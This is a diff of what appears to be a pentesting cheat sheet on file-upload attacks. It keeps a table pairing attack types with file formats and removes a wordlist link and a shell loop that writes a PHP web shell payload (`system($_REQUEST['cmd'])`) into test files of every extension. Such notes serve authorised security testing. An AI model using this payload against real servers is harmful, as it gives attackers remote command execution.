@@ -41,12 +41,3 @@
 | `XSS` | HTML, JS, SVG, GIF |
 | `XXE`/`SSRF` | XML, SVG, PDF, PPT, DOC |
 | `DoS` | ZIP, JPG, PNG |
-
-
-
-
-https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
-
-
-for i in $(cat ext);do touch $i; done
-for i in $(ls); do echo "<?php system($_REQUEST['cmd']); ?>" >> $i;done
